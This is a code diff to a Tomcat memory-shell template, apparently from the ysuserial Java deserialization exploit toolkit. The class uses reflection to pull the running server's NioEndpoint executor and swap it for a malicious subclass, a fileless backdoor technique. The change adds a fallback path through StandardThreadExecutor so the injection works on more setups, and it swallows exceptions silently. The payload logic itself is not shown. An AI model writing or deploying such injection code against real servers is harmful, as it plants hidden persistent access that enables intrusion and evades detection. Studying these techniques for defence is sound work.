@@ -1,6 +1,7 @@
 package org.su18.ysuserial.payloads.templates.memshell.tomcat;
 
 
+import org.apache.catalina.core.StandardThreadExecutor;
 import org.apache.tomcat.util.net.NioEndpoint;
 import org.apache.tomcat.util.threads.ThreadPoolExecutor;
 
@@ -17,11 +18,17 @@ public class TEXMSFromThread extends ThreadPoolExecutor {
 
 	static {
 		try {
+			ThreadPoolExecutor exec        = null;
 			NioEndpoint        nioEndpoint = (NioEndpoint) getStandardService();
-			ThreadPoolExecutor exec        = (ThreadPoolExecutor) getFieldValue(nioEndpoint, "executor");
-			nioEndpoint.setExecutor(new TEXMSFromThread(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler()));
-		} catch (Exception e) {
-			e.printStackTrace();
+			try {
+				exec = (ThreadPoolExecutor) getFieldValue(nioEndpoint, "executor");
+			} catch (ClassCastException e) {
+				StandardThreadExecutor standardExec = (StandardThreadExecutor) getFieldValue(nioEndpoint, "executor");
+				exec = (ThreadPoolExecutor) getFieldValue(standardExec, "executor");
+			}
+			TEXMSFromThread exe = new TEXMSFromThread(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
+			nioEndpoint.setExecutor(exe);
+		} catch (Exception ignored) {
 		}
 	}
 
